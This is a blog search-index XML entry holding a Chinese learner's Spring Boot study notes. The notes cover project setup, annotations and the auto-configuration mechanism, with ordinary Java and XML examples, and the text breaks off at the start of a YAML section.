<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SpringBoot学习</title>
    <link href="/posts/d2e0f0f1.html"/>
    <url>/posts/d2e0f0f1.html</url>
    
    <content type="html"><![CDATA[<p>视频讲的很详细，自己写给自己</p><h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>应用项目拆成一个个微服务（一个个业务），服务之间用HTTP、RPC或者其他协议进行通信</p><p>背景：一开始一个war就能跑起来，但是一台机子承载能力有限，所以项目分开放。数据库放在一台机子，另外一个应用放在另外一台机子。</p><p>all in one是指所有服务封装在一个应用中。它的好处是易于开发和测试方便部署。坏处是修改项目需要停掉服务，重新打包。</p><p>微服务打破all in one方式，把每个功能独立出来，修改一个不影响其他的</p><p>去中心化，每个服务可以用不同语言编写</p><p>微服务架构必然会产生分布式</p><h2 id="HelloSpringBoot"><a href="#HelloSpringBoot" class="headerlink" title="HelloSpringBoot"></a>HelloSpringBoot</h2><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>在IDEA里面创建</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221122161708185-16699737693501.png"></p><p>选择SpringWeb依赖即可</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221122161740715-16699737693502.png"></p><p>最后点击创建</p><p>看看大概这个项目</p><p>main&#x2F;java文件夹下面有个默认的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2Application</span> &#123;<br><span class="hljs-comment">//项目程序主入口</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Demo2Application.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>application.properties是springboot的配置文件</p><p>test&#x2F;java里面有单元测试类</p><p>在项目程序主类同级目录下，新建一个controller包</p><p>新建一个控制器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><span class="hljs-comment">//因为返回值只需要字符串，所有用RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello springboot&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//或者按下面这样，点进去RestController发现就是ResponseBody和Controller</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello springboot&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看看主类中的<code>@SpringBootApplication</code>源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br>...<br></code></pre></td></tr></table></figure><p>看看其中的<code>@SpringBootConfiguration</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@Indexed</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后点击<code>@Configuration</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Configuration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Component.class</span><br><span class="hljs-meta">    )</span><br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现它是一个<code>@Component</code>，所以主类本身是spring的一个组件</p><p>再看看pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--这个依赖集成了一个tomcat，dispatcherServlet配置，xml配置--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-comment">&lt;!--单元测试--&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>              <span class="hljs-comment">&lt;!--打包插件--&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>双击package，打包项目，在target目录可以找到生成的jar包</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221122164414005-16699737693503.png"></p><p>看看pom.xml的依赖</p><p><code>spring-boot-starter-web</code>用于实现HTTP接口，使用Tomcat作为默认嵌入式容器，所以我们不需要配置tomcat就能运行springboot项目</p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>在配置文件application.properties里面配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8081</span><br></code></pre></td></tr></table></figure><p>在resources文件夹下创建banner.txt</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tex">   <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>                     <span class="hljs-built_in">_</span>       <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>            <span class="hljs-built_in">_</span>                         <span class="hljs-built_in">_</span>                              <span class="hljs-built_in">_</span>     <br>  | <span class="hljs-built_in">_</span> )    <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>     <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>    | |<span class="hljs-built_in">_</span>    / <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>|    <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>    | |<span class="hljs-built_in">_</span>      <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>     <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>     | |            <span class="hljs-built_in">_</span> <span class="hljs-built_in">_</span>      <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>    | |<span class="hljs-built_in">_</span>   <br>  | <span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>  / <span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>  / <span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>  |  <span class="hljs-built_in">_</span>|   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>  / <span class="hljs-built_in">_</span>|   | &#x27; <span class="hljs-keyword">\ </span>   / <span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>  / <span class="hljs-built_in">_</span> <span class="hljs-keyword">\ </span>   | |      <span class="hljs-built_in">_</span>    | &#x27; <span class="hljs-keyword">\ </span>   / -<span class="hljs-built_in">_</span>)   |  <span class="hljs-built_in">_</span>|  <br>  |<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-built_in">_</span><span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span>|   |<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span>|<span class="hljs-built_in">_</span>  |<span class="hljs-built_in">_</span>||<span class="hljs-built_in">_</span>|   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>/   <span class="hljs-built_in">_</span>|<span class="hljs-built_in">_</span>|<span class="hljs-built_in">_</span>   <span class="hljs-built_in">_</span>(<span class="hljs-built_in">_</span>)<span class="hljs-built_in">_</span>  |<span class="hljs-built_in">_</span>||<span class="hljs-built_in">_</span>|   <span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>|   <span class="hljs-built_in">_</span><span class="hljs-keyword">\_</span><span class="hljs-built_in">_</span>|  <br><span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;|<span class="hljs-built_in">_</span>|&quot;&quot;&quot;&quot;&quot;| <br>&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27; <br><br></code></pre></td></tr></table></figure><p>重启项目可以看到控制台中的字符画</p><h3 id="修改依赖版本"><a href="#修改依赖版本" class="headerlink" title="修改依赖版本"></a>修改依赖版本</h3><p>如果不想要springboot的依赖版本</p><p>需要先查看spring-boot-dependencies里面规定当前依赖的版本用的key，比如我们在spring-boot-dependencies-2.7.5.pom里面找到<code>&lt;mysql.version&gt;8.0.31&lt;/mysql.version&gt;</code>这一行</p><p>然后在<code>&lt;properties&gt;</code>标签里添加配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.43<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="SpringBoot2特点"><a href="#SpringBoot2特点" class="headerlink" title="SpringBoot2特点"></a>SpringBoot2特点</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p>开发导入starter场景启动器，（官方约定）spring-boot-starter开头的starter是官方starter，以spring-boot-starter结尾的是第三方的</p><p>无需关注版本号，自动版本仲裁</p><p>可以修改版本号</p><h3 id="自动配置（略）"><a href="#自动配置（略）" class="headerlink" title="自动配置（略）"></a>自动配置（略）</h3><p>tomcat、springmvc、web常见功能、默认包结构（主程序下的包都能被默认扫描，也可以自定义包目录）、配置默认值、按需加载所有自动配置项……</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2Application</span> &#123;<br>    <span class="hljs-comment">//程序主入口</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//返回IOC容器</span><br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(Demo2Application.class, args);<br>        <span class="hljs-comment">//查看容器里面的组件</span><br>        String[] names = run.getBeanDefinitionNames();<br>        <span class="hljs-keyword">for</span> (String name : names)&#123;<br>            System.out.println(name);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="底层注解"><a href="#底层注解" class="headerlink" title="底层注解"></a>底层注解</h2><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h3><p>springboot用配置类给容器添加组件，以前是xml配置文件，@Bean注解相当于给容器添加组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = true)</span><br><span class="hljs-comment">//设置true，则springboot总会检测这个组件是否在容器中，如果有就不会新创建一个对象。flase则new几次得到的都不一样</span><br></code></pre></td></tr></table></figure><h3 id="Import"><a href="#Import" class="headerlink" title="@Import"></a>@Import</h3><p>写在组件类上面，用来导入指定组件（类），创建组件并放在容器中，导入的组件名字是包名+类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;User.class, pet.class&#125;)</span><br></code></pre></td></tr></table></figure><h3 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h3><p>条件装配：满足条件后才会进行组件注入</p><p>一个实例：User组件依赖pet组件，在User组件上加一个<code>@ConditionalOnBean(name = &quot;pet&quot;)</code>，当容器中有pet组件时，才把User组件放进容器</p><h3 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h3><p>自动把beans配置文件里面的组件放到容器里面，因为springboot默认不识别配置文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ImportResource(&quot;classpath:beans.xml&quot;)</span><br></code></pre></td></tr></table></figure><h3 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h3><p>原来会把数据库账号密码等写到配置文件，再解析给数据库连接池。现在用<code>@ConfigurationProperties</code>和<code>@Component</code>（放在容器中）即可。相当于把类用配置文件中的信息进行初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowored</span><br>Car cat;<span class="hljs-comment">//前面还要加个注解</span><br></code></pre></td></tr></table></figure><p>第二种方法，在配置类里面加<code>@EnableConfigurationProperties(Car.class)</code>，因为配置类以及在容器中，所以受其庇荫也在容器中</p><h2 id="自动配置原理入门"><a href="#自动配置原理入门" class="headerlink" title="自动配置原理入门"></a>自动配置原理入门</h2><h3 id="引导加载自动配置类"><a href="#引导加载自动配置类" class="headerlink" title="引导加载自动配置类"></a>引导加载自动配置类</h3><p>主要分析<code>@SpringBootApplication</code>中的三个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan</span><br></code></pre></td></tr></table></figure><h4 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h4><p>里面有<code>@Configuration</code>，代表当前是一个配置，说明main程序也是springboot的配置类</p><h4 id="EnableAutoConfiguration（核心）"><a href="#EnableAutoConfiguration（核心）" class="headerlink" title="@EnableAutoConfiguration（核心）"></a>@EnableAutoConfiguration（核心）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span>&#123;...&#125;<br></code></pre></td></tr></table></figure><h5 id="分析-AutoConfigurationPackage"><a href="#分析-AutoConfigurationPackage" class="headerlink" title="分析@AutoConfigurationPackage"></a>分析@AutoConfigurationPackage</h5><p><code>@AutoConfigurationPackage</code>自动配置包，里面有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;AutoConfigurationPackages.Registrar.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;...&#125;<br></code></pre></td></tr></table></figure><p><code>@Import</code>给容器导入一个组件，利用<code>AutoConfigurationPackages.Registrar</code>这个组件导入一系列组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registrar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImportBeanDefinitionRegistrar</span>, DeterminableImports &#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerBeanDefinitions</span><span class="hljs-params">(AnnotationMetadata metadata, BeanDefinitionRegistry registry)</span> &#123;<br>          AutoConfigurationPackages.register(registry, (String[])(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageImports</span>(metadata)).getPackageNames().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]));<br>      &#125;<br><span class="hljs-comment">//......</span><br><br>  &#125;<br></code></pre></td></tr></table></figure><p>看<code>AutoConfigurationPackages.register</code>方法，<code>PackageImports(metadata)</code>表示导入元信息，实际上接受Main类的元信息，<code>getPackageNames()</code>表示获得Main类所在包的名字。最后把包名封装到数组里面，把某个包里面的组件导入进来。</p><h5 id="分析-Import-AutoConfigurationImportSelector-class"><a href="#分析-Import-AutoConfigurationImportSelector-class" class="headerlink" title="分析@Import({AutoConfigurationImportSelector.class})"></a>分析@Import({AutoConfigurationImportSelector.class})</h5><p>进入AutoConfigurationImportSelector这个类</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221128094618927-16699737693504.png"></p><p>执行到这句话的下一步，可以看到configurations里面的内容都是类名，这个函数功能是获取所有候选组件</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221128094729770-16699737693505.png"></p><p>这个函数里面是利用工厂<code>SpringFactoriesLoader.loadFactoryNames(getSpringFactoriesLoaderFactoryClass(), getBeanClassLoader()));</code>-&gt;<code>Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(ClassLoader classLoader)</code>加载，得到所有组件</p><h4 id="ComponentScan（略）"><a href="#ComponentScan（略）" class="headerlink" title="@ComponentScan（略）"></a>@ComponentScan（略）</h4><p>指定扫描哪些</p><h3 id="按需开启自动配置项"><a href="#按需开启自动配置项" class="headerlink" title="按需开启自动配置项"></a>按需开启自动配置项</h3><p>虽然144个场景默认全部加载，但是最终会按需配置。导入的组件是否生效取决容器是否有其所依赖组件，因为这些组件源代码里面写了<code>@Conditional</code>之类的注解，这就是之前讲这个注解的原因，讲了才知道源代码这个注解有什么用，对组件生效有什么影响</p><h3 id="定制化修改自动配置"><a href="#定制化修改自动配置" class="headerlink" title="定制化修改自动配置"></a>定制化修改自动配置</h3><p>看看DispatcherServletAutoConfiguration.java里面的几行源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnBean(MultipartResolver.class)</span><span class="hljs-comment">//容器中有这个组件</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span><span class="hljs-comment">//容器中没有这个名字</span><br><span class="hljs-keyword">public</span> MultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">(MultipartResolver resolver)</span> &#123;<br>    <span class="hljs-comment">//给@Bean标注的方法传入了对象参数，这个参数值就会从容器中找，赋值完再return</span><br>    <span class="hljs-comment">//防止位置文件上传解析器不符合规范</span><br><span class="hljs-comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span><br><span class="hljs-keyword">return</span> resolver;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>springboot默认会在底层配好组件，xxxAutoConfiguration导进来</p></li><li><p>每个自动配置类按照条件进行生效，默认会绑定配置文件里面的值，从xxxProperties里面拿默认值，xxxProperties又和配置文件进行了绑定</p></li><li><p>生效的配置类就会给容器中装配很多组件</p></li><li><p>只要容器中有这些组件，相当于这些功能就有了</p></li><li><p>定制化配置：用户直接@Bean替换底层的组件，用户去看组件是获得的配置文件的什么值就直接去改</p></li></ul><h2 id="开发技巧"><a href="#开发技巧" class="headerlink" title="开发技巧"></a>开发技巧</h2><h3 id="如何编写springboot应用"><a href="#如何编写springboot应用" class="headerlink" title="如何编写springboot应用"></a>如何编写springboot应用</h3><ul><li><p>引入场景依赖（实现一个功能前看springboot有没有现成的）</p></li><li><p>查看自动配置了哪些依赖（选做，因为涉及底层）</p></li><li><p>是否需要修改</p></li></ul><h3 id="Lombok简化开发（略）"><a href="#Lombok简化开发（略）" class="headerlink" title="Lombok简化开发（略）"></a>Lombok简化开发（略）</h3><h3 id="dev-tools（略）"><a href="#dev-tools（略）" class="headerlink" title="dev-tools（略）"></a>dev-tools（略）</h3><h3 id="Spring-Initailizr（略）"><a href="#Spring-Initailizr（略）" class="headerlink" title="Spring Initailizr（略）"></a>Spring Initailizr（略）</h3><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="properties（略）"><a href="#properties（略）" class="headerlink" title="properties（略）"></a>properties（略）</h3><h3 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h3><p>标记语言，适合以数据为中心的配置文件</p><p>下面是一个实例</p><p>先创建一个bean包，里面创建一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 